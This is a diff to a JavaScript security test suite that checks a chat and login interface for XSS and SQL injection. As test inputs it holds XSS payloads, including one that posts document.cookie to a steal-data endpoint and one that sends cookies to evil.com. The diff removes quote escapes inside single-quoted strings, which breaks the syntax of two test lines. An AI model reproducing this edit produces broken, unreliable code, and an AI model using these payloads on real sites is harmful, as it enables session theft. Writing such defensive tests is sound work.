@@ -67,7 +67,7 @@ describe('Security Tests', () => {
       const sendButton = screen.getByRole('button', { name: /enviar/i })
 
       // Test XSS attempt
-      const maliciousInput = '<script>alert("XSS")</script><img src="x" onerror="alert(\'XSS\')">'
+      const maliciousInput = '<script>alert("XSS")</script><img src="x" onerror="alert('XSS')">'
       
       await user.type(messageInput, maliciousInput)
       await user.click(sendButton)
@@ -109,7 +109,7 @@ describe('Security Tests', () => {
       // Should validate and sanitize input
       const loginCall = mockLogin.mock.calls[0]
       expect(loginCall[0].email).not.toContain('DROP TABLE')
-      expect(loginCall[0].email).toMatch(/^[^\';]+$/) // No SQL injection characters
+      expect(loginCall[0].email).toMatch(/^[^';]+$/) // No SQL injection characters
     })
 
     it('should validate and sanitize file uploads', async () => {
@@ -185,7 +185,7 @@ describe('Security Tests', () => {
     it('should prevent stored XSS in user content', async () => {
       const maliciousContent = {
         userMessage: '<script>fetch("/api/steal-data", {method: "POST", body: document.cookie})</script>',
-        aiResponse: '<img src="x" onerror="window.location=\'http://evil.com?cookie=\'+document.cookie">'
+        aiResponse: '<img src="x" onerror="window.location='http://evil.com?cookie='+document.cookie">'
       }
 
       const ConversationDisplay = ({ messages }) => {
